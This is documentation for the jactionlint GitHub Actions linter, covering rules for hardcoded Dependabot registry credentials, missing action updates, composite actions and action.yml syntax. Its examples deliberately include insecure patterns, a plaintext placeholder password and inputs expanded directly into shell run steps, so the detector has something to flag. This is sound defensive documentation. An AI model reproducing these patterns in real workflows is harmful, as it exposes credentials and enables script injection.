The rule `hardcoded-registry-credentials` (in the `default` profile, at the level `error`) reports a credential that is written as plain text in the `registries` of `dependabot.yml`. The `registries` tell Dependabot how to sign in to a private package registry. Dependabot reads a secret from the Dependabot secrets of the repository when a value is written as `${{secrets.NAME}}`, so a `password`, `token`, `key` or `auth-key` that is a literal puts the credential in the repository and its history, where everybody who can read the code (and every fork) has it. A password in the user information of the `url` (`https://user:password@host/`) is the same. The rule is the counterpart of [`hardcoded-container-credentials`](#check-hardcoded-credentials) for `dependabot.yml`. zizmor has no audit for it yet (see [zizmor#1222](https://github.com/zizmorcore/zizmor/issues/1222)).

Example input:

```yaml
version: 2
registries:
  dockerhub:
    type: docker-registry
    url: https://registry.hub.docker.com
    username: octocat
    # ERROR: the password is written in the repository
    password: not-a-real-password
  npm-github:
    type: npm-registry
    url: https://npm.pkg.github.com
    # OK: a Dependabot secret
    token: ${{secrets.NPM_TOKEN}}
updates:
  - package-ecosystem: docker
    directory: "/"
    schedule:
      interval: weekly
    cooldown:
      default-days: 7
    registries:
      - dockerhub
  - package-ecosystem: npm
    directory: "/"
    schedule:
      interval: weekly
    cooldown:
      default-days: 7
    registries:
      - npm-github
```

Output:

```
.github/dependabot.yml:8:15: "password" of registry "dockerhub" is written in plain text. store it as a Dependabot secret and write ${{secrets.NAME}} instead, and rotate the credential because it is in the history of the repository [hardcoded-registry-credentials]
  |
8 |     password: not-a-real-password
  |               ^~~~~~~~~~~~~~~~~~~
```

<!-- Skip playground link -->

**What is reported.** A `password`, `token`, `key` or `auth-key` of a registry that is not empty and is not an expression, and a password in the user information of the `url`. The message does not repeat the value.

**What is not reported.** A value that has an expression (`${{ ... }}`) is read as a reference, so `${{secrets.NAME}}` is not reported. User names and the other settings, such as the OIDC settings (`tenant-id`, `client-id` and so on), are not credentials and are not reported. A user name in the user information of the `url` (`https://token@host/`) is not reported either.

**Fix.** Store the credential as a Dependabot secret and write `${{secrets.NAME}}` instead, and rotate the credential, because it is in the history of the repository. There is no automatic fix, because jactionlint cannot know the name of the secret, and a credential that was committed has to be rotated anyway.

**Configure.** To turn the rule off, set `hardcoded-registry-credentials: off` in `rules` of [the configuration file](config.md#rules).

<a id="check-dependabot-missing-actions-update"></a>
## Dependabot updates of actions (pedantic)

The rule `dependabot-missing-actions-update` reports a `dependabot.yml` that has no update with `package-ecosystem: github-actions` while `.github/workflows` has a workflow that uses an action or a reusable workflow (not a local path or a `docker://` image). A repository that uses Dependabot for its dependencies often forgets that the actions in its workflows are dependencies too: they are never updated, or updated by hand when someone notices. The rule also reports the local composite actions that no `github-actions` update covers.

The rule is in the `pedantic` profile, at the level `warn`. It is a policy of jactionlint; zizmor has no such audit ([jactionlint and zizmor](./zizmor-parity.md)).

Example input:

```yaml
# select: dependabot-missing-actions-update
# profile: pedantic
version: 2
updates:
  # ERROR: the workflows of the repository use actions but nothing updates them
  - package-ecosystem: npm
    directory: "/"
    schedule:
      interval: weekly
    cooldown:
      default-days: 7
```

Example file: .github/workflows/ci.yml

```yaml
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6
```

Output:

```
.github/dependabot.yml:3:1: warning: this repository uses actions in its workflows but no update has the "github-actions" package ecosystem, so Dependabot never updates them. add an update with "package-ecosystem: github-actions" and "directory: /" [dependabot-missing-actions-update]
  |
3 | version: 2
  | ^~~~~~~~
```

<!-- Skip playground link -->

The output is that of a repository with a workflow that uses `actions/checkout` and no Renovate configuration. The finding is at the first line of the file.

**What is not reported.**

- A repository with a Renovate configuration, because another tool may update the actions. jactionlint looks for `renovate.json`, `renovate.json5`, `.renovaterc`, `.renovaterc.json`, `.renovaterc.json5`, `.github/renovate.json`, `.github/renovate.json5`, `.gitlab/renovate.json`, `.gitlab/renovate.json5` and the `renovate` key of `package.json`.
- A repository without `dependabot.yml`: there is no file to report.

**Fix.** A missing update has no automatic fix, because the update needs a schedule that only you can choose. The local composite actions that an update does not cover have an unsafe fix, see **Local composite actions** in this section.

**Configure.** The `pedantic` profile enables the rule. To enable it in another profile, set `rules: {dependabot-missing-actions-update: warn}`. A finding of the level `warn` does not change the exit status unless you use `--strict-exit`.

**Local composite actions.** A `github-actions` update reads the workflows of `.github/workflows` and the `action.yml` of the directory it is given. With `directory: /` the local composite actions (`.github/actions/*/action.yml`, or any other action of the repository that a workflow calls with `./path`) are never updated, which is the same mistake one level down (zizmor [#1806](https://github.com/zizmorcore/zizmor/issues/1806), dependabot-core [#6345](https://github.com/dependabot/dependabot-core/issues/6345)). When the file has a `github-actions` update, the check also reports the local composite actions that use an action or a reusable workflow and that no `github-actions` update names, either as `directory` or as an entry of `directories`.

Only `directories` takes globs (Dependabot documents globbing and the wildcard for `directories`, not for `directory`). `*` is one name and `**` any number of directories, so `/.github/actions/**/*` covers every directory under `.github/actions`, and `/**/*` alone is Dependabot's "current directory and the recursive subdirectories" and covers the root as well. `directory: /.github/actions/*` covers nothing:

```yaml
updates:
  - package-ecosystem: github-actions
    directories:
      - /
      - /.github/actions/**/*
    schedule:
      interval: weekly
```

**Disabled updates.** An update that is disabled, with `open-pull-requests-limit: 0` or an `ignore` of every dependency, opens no pull request and does not count for either check: with only disabled `github-actions` updates, the repository is reported as one whose actions are not updated. The rule asks whether the repository uses actions that Dependabot can update of both the workflows and the local composite actions, for the missing update as well as for the disabled ones. The message says where the actions are. When only the workflows use them it asks for `directory: /`, and when the local composite actions use them, alone or besides the workflows, it names those actions and asks for `directories` with `/` and those actions. The advice is the same whether the file has no `github-actions` update, only disabled ones or an active one that misses the local actions.

**Fix for local composite actions.** The fix replaces `directory: /` of an update that is the only `github-actions` one by `directories: ["/", "/.github/actions/**/*"]`; the actions that are not under `.github/actions` are listed by their directory. It makes Dependabot propose pull requests it did not, so it is unsafe and applied only by `--fix=unsafe`. It is not offered when the file has several `github-actions` updates or writes the key in a way it cannot edit. The check is silent when the repository has a Renovate configuration.

<a id="check-composite-actions"></a>
## Composite actions

jactionlint lints the metadata file of an action (`action.yml` or `action.yaml`) together with the workflows. The `steps` of a composite action (`runs.using: composite`) get the same rules as the steps of a workflow job, with the same rule IDs. Output formats, [ignore comments](./ignore.md#ignore-some-errors), `paths:` in [the config file](./config.md#configuration-file), SARIF and `--fix` work for actions like for workflows.

**Which files are linted.** When the repository is linted without file arguments, jactionlint checks the action in the root of the repository, every action under `.github/actions`, and every directory that a local `uses: ./path` of a workflow or of another action refers to. An action is also checked when its file is given explicitly (`jactionlint .github/actions/setup/action.yml`) or with `--stdin-filename`. The file is recognized by its name: `action.yml` and `action.yaml` are actions anywhere except directly in `.github/workflows`, where they are workflows.

Actions that run JavaScript (`node20`, `node24`, ...) or a container (`docker`) have no steps, so only their metadata is checked: the syntax, the `docker://` image of a Docker action by `unpinned-images`, and a removed runtime such as `node20` by the pedantic [`deprecated-node-runtime`](#check-deprecated-node-runtime).

**What differs from a workflow.**

- Every `run:` step must have `shell:`, because a composite action has no default shell. A missing one is a finding of `action-syntax`, so the opt-in `require-shell` is not used for actions.
- The `inputs` context has the inputs declared in the `inputs:` section (all of them are strings), and `outputs.<id>.value` can read the `steps` context. The `secrets` context is not available: [secrets must be passed as an input](https://docs.github.com/en/actions/learn-github-actions/contexts).
- There is no `on:`, `permissions:`, `runs-on:`, `needs:`, `timeout-minutes:` or `concurrency:`: they belong to the workflow that calls the action, so the rules about them are not applied to actions.

**Caller-aware rules.** Some findings depend on how the action is run, which only the calling workflow knows. For every action, jactionlint finds the local workflows that call it with `uses: ./path`, also through other local actions and reusable workflows (`uses: ./.github/workflows/build.yml`; a reusable workflow runs in the context of the workflow that calls it). Cycles, like an action that calls itself, are followed once. The context of an action is the most dangerous one among its callers: an action called from a `pull_request` workflow and from a `pull_request_target` workflow is judged as if it only ran in the second one. The message names the workflow, for example `.github/workflows/release.yml runs on the release event and calls this action`.

- `cache-poisoning` reports a restored cache when a calling workflow runs on `release` or on pushed tags.
- `bot-conditions` offers its fix (which needs a pull request event) only when every caller runs on a pull request event.
- `github-env`, `untrusted-checkout`, `untrusted-artifact` and `agentic-actions` look at the events of the callers like they look at the events of a workflow: `github-env` and `untrusted-checkout` need a caller that runs on `pull_request_target` (or `workflow_run`), `untrusted-artifact` one that runs on `workflow_run`, and `agentic-actions` one that outsiders can steer.
- `template-injection` adds the calling workflow to the message when it runs on a trigger that an outsider controls (`pull_request_target`, `workflow_run`, `issue_comment`, `issues`, comments and reviews).

When no local workflow calls the action (it is published for other repositories, or used by a workflow that is not in the repository), the rules do not assume a trigger and judge the action by its own steps: the findings of the caller-aware rules are not reported, and `bot-conditions` has no fix. Findings about the inputs (for example that `inputs.title` is expanded into a script) are reported either way, because any caller can pass text that an outsider controls. jactionlint does not look at what the callers pass in `with:`.

**How the rules treat actions.** Every rule ID is in one of these three lists.

- **Applies** to the steps (and the metadata) of an action: `action-release-cooldown`, `action-syntax`, `actions-lock`, `actions-lock-drift`, `adhoc-packages`, `archived-uses`, `argument-injection`, `artipacked`, `background-step-not-waited`, `checkout-static-credentials`, `command-injection`, `conflicting-action-inputs`, `constant-condition`, `context-availability`, `continue-on-error`, `deprecated-action-input`, `deprecated-commands`, `deprecated-node-runtime`, `duplicate-key`, `duplicate-step-id`, `environment-file-redirect`, `expired-ignore`, `expression-syntax`, `expression-type`, `fail-fast-action-inputs`, `forbidden-uses`, `github-app`, `github-script-syntax`, `if-always-true`, `impostor-commit`, `insecure-commands`, `insecure-ssh-keyscan`, `insecure-url-scheme`, `invalid-env-var-name`, `invalid-function-call`, `invalid-id`, `invalid-ignore-comment`, `invalid-local-action`, `invalid-parallel-step`, `invalid-shell-name`, `invalid-uses`, `invisible-characters`, `known-vulnerable-actions`, `malformed-expression-delimiters`, `max-run-lines`, `merge-key`, `misfeature`, `missing-action-input`, `missing-version-comment`, `multiline-plain-run`, `obfuscation`, `outdated-action-runner`, `output-clobbering`, `pipeline-without-pipefail`, `pyflakes`, `recursive-alias`, `ref-confusion`, `ref-version-mismatch`, `repojacking`, `require-expression-wrapping`, `self-repository`, `shell-syntax`, `shellcheck`, `stale-action-refs`, `superfluous-actions`, `template-injection`, `typosquat-uses`, `undefined-function`, `undefined-property`, `unknown-action-input`, `unlocked-install`, `unpinnable-action`, `unpinned-images`, `unpinned-tools`, `unpinned-uses`, `unsound-contains`, `unsound-prefix-match`, `unsound-ternary`, `unused-anchor`, `unused-ignore`, `unverified-download`, `use-trusted-publishing`, `yaml-syntax`.
- **Caller-dependent**: `agentic-actions`, `bot-conditions`, `cache-poisoning`, `github-env` (its findings about untrusted input do not depend on the caller), `untrusted-artifact` and `untrusted-checkout`.
- **Not applicable** because an action does not have what the rule checks, or because only the calling job can decide (`unused-baseline-entry` is about the baseline file, not about a workflow or an action): `anonymous-definition`, `comment-trigger-authorization`, `concurrency-cancels-prs`, `concurrency-cancels-release`, `concurrency-deadlock`, `concurrency-limits`, `conflicting-runner-labels`, `cron-too-frequent`, `cyclic-job-needs`, `dangerous-triggers`, `dependabot-cooldown`, `dependabot-execution`, `dependabot-missing-actions-update`, `dependabot-syntax`, `deprecated-runner-label`, `duplicate-job-id`, `duplicate-job-needs`, `duplicate-triggers`, `event-name-never-received`, `excessive-permissions`, `gate-job-skipped-on-failure`, `gh-without-token`, `hardcoded-container-credentials`, `hardcoded-registry-credentials`, `insufficient-permissions`, `invalid-activity-type`, `invalid-cron`, `invalid-event-config`, `invalid-event-filter`, `invalid-glob`, `invalid-label-pattern`, `invalid-local-workflow`, `invalid-permissions`, `invalid-timezone`, `invalid-workflow-call`, `invalid-workflow-call-input`, `invalid-workflow-dispatch-input`, `local-action-checkout`, `macos-gnu-flags`, `matrix-duplicate-value`, `matrix-invalid-exclude`, `missing-permissions`, `missing-timeout`, `missing-workflow-input`, `missing-workflow-secret`, `mutable-runner-label`, `overprovisioned-secrets`, `require-shell`, `required-actions`, `secrets-inherit`, `secrets-outside-env`, `self-hosted-runner`, `timeout-too-long`, `ubuntu-slim-limits`, `undefined-job-needs`, `undocumented-permissions`, `unknown-event`, `unknown-runner-label`, `unknown-workflow-input`, `unknown-workflow-secret`, `unmatched-paths-filter`, `unredacted-secrets`, `unused-baseline-entry`, `unused-job-output`, `unused-needs`, `unused-workflow-input`, `unused-workflow-secret`, `workflow-call-permissions`, `workflow-input-type`, `workflow-run-names`, `workflow-secret-scope`, `workflow-syntax`.

Example input:

```yaml
name: Build
description: Builds the project
inputs:
  token:
    description: Token to publish with
    required: true
runs:
  using: composite
  steps:
    # ERROR: Secrets are not passed to composite actions. Declare an input instead
    - run: ./publish.sh "${{ secrets.PUBLISH_TOKEN }}"
      shell: bash
    # ERROR: The input "tokan" is not declared
    - run: ./build.sh "${{ inputs.tokan }}"
      shell: bash
```

Output:

```
.github/actions/example/action.yml:11:30: context "secrets" is not allowed in a composite action because secrets are not passed to it. declare an input and let the workflow pass the secret with "with:". available contexts are "env", "github", "inputs", "job", "matrix", "needs", "runner", "steps", "strategy", "vars". see https://docs.github.com/en/actions/learn-github-actions/contexts#context-availability for more details [context-availability]
   |
11 |     - run: ./publish.sh "${{ secrets.PUBLISH_TOKEN }}"
   |                              ^~~~~~~~~~~~~~~~~~~~~
.github/actions/example/action.yml:14:28: "inputs.tokan" is an input chosen by whoever runs this, which is not validated and can hold shell syntax. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [template-injection]
   |
14 |     - run: ./build.sh "${{ inputs.tokan }}"
   |                            ^~~~~~~~~~~~
.github/actions/example/action.yml:14:28: property "tokan" is not defined in object type {token: string} [undefined-property]
   |
14 |     - run: ./build.sh "${{ inputs.tokan }}"
   |                            ^~~~~~~~~~~~
```

<!-- Skip playground link -->

The output has one finding for each of three rules: `secrets` is not available in a composite action (`context-availability`), `inputs.tokan` is not declared (`undefined-property`), and `inputs.tokan` reaches a script, where any caller can fill it with text that an outsider controls (`template-injection`). The rule [`action-syntax`](#check-composite-action-syntax) reports the syntax of the file.

<a id="check-composite-action-syntax"></a>
## Composite action syntax

The rule `action-syntax` reports an action file (`action.yml` or `action.yaml`) that does not follow [the syntax of the action metadata](https://docs.github.com/en/actions/creating-actions/metadata-syntax-for-github-actions).

**What is reported.** jactionlint checks the syntax of the file like the syntax of workflows:

- unknown keys (with a suggestion) and duplicate keys
- a missing `runs.using`, `runs.main` of a JavaScript action, `runs.image` of a Docker action or `runs.steps` of a composite action
- keys that belong to another kind of action (`steps` in a `node24` action)
- values of the wrong type
- a `run:` step of a composite action without `shell:`.

The keys and the contexts that the runner rejects in an `action.yml` are reported too, with the rule ID `action-syntax` or the ID of the expression check:

- `timeout-minutes` in a step of a composite action: the steps of an action have no such key, so set it on the step that uses the action
- a context other than `github`, `strategy`, `matrix`, `job` and `runner` (and `hashFiles()`) in the `default` of an input
- an unknown context or function in `runs.pre-if` and `runs.post-if`.

**Which runtimes are accepted.** Three rules look at `runs.using`, and each accepts other values:

| Rule | What it checks | Values of `runs.using` |
| --- | --- | --- |
| `action-syntax` | The action file itself | `composite`, `docker`, and `node` followed by a version number (`node20`, `node24`) |
| `invalid-local-action` | The action as a workflow calls it with `uses: ./path` ([action metadata syntax](#action-metadata-syntax)) | `composite`, `docker`, `node20` and `node24` |
| `deprecated-node-runtime` (pedantic) | The runtime of the action ([removed Node.js runtimes](#check-deprecated-node-runtime)) | Reports `node12`, `node16` and `node20` |

Example input:

```yaml
name: Example
description: Does not follow the syntax of action.yml
inputs:
  who:
    # ERROR: "descriptions" is a typo of "description"
    descriptions: Who to greet
runs:
  using: composite
  steps:
    # ERROR: The shell is required in a composite action
    - run: echo "hello ${{ inputs.who }}"
    - uses: actions/checkout@v4
      # ERROR: "shell" is only for "run:" steps
      shell: bash
  # ERROR: "main" is only for JavaScript actions
  main: dist/index.js
```

Output:

```
.github/actions/example/action.yml:6:5: unexpected key "descriptions" for input "who". expected one of "default", "deprecationMessage", "description", "required" [action-syntax]
  |
6 |     descriptions: Who to greet
  |     ^~~~~~~~~~~~~
.github/actions/example/action.yml:11:7: "shell" is required for a "run" step of a composite action, which has no default shell. for example, add "shell: bash" [action-syntax]
   |
11 |     - run: echo "hello ${{ inputs.who }}"
   |       ^~~~
.github/actions/example/action.yml:11:28: "inputs.who" is an input chosen by whoever runs this, which is not validated and can hold shell syntax. avoid using it directly in inline scripts. instead, pass it through an environment variable. see https://docs.github.com/en/actions/reference/security/secure-use#good-practices-for-mitigating-script-injection-attacks for more details [template-injection]
   |
11 |     - run: echo "hello ${{ inputs.who }}"
   |                            ^~~~~~~~~~
.github/actions/example/action.yml:14:7: unexpected key "shell" for step to execute action. expected one of "background", "continue-on-error", "env", "id", "if", "name", "timeout-minutes", "uses", "with" [action-syntax]
   |
14 |       shell: bash
   |       ^~~~~~
.github/actions/example/action.yml:16:3: "main" is not available in "runs" section of the composite action. it is for JavaScript and Docker actions [action-syntax]
   |
16 |   main: dist/index.js
   |   ^~~~~
```

<!-- Skip playground link -->

The `template-injection` finding in the output is not a syntax finding: `inputs.who` is expanded into a script, where a caller can fill it with text that an outsider controls. The [composite actions](#check-composite-actions) check explains which other rules apply to action files. `jactionlint --select action-syntax` reports only the findings of this rule.
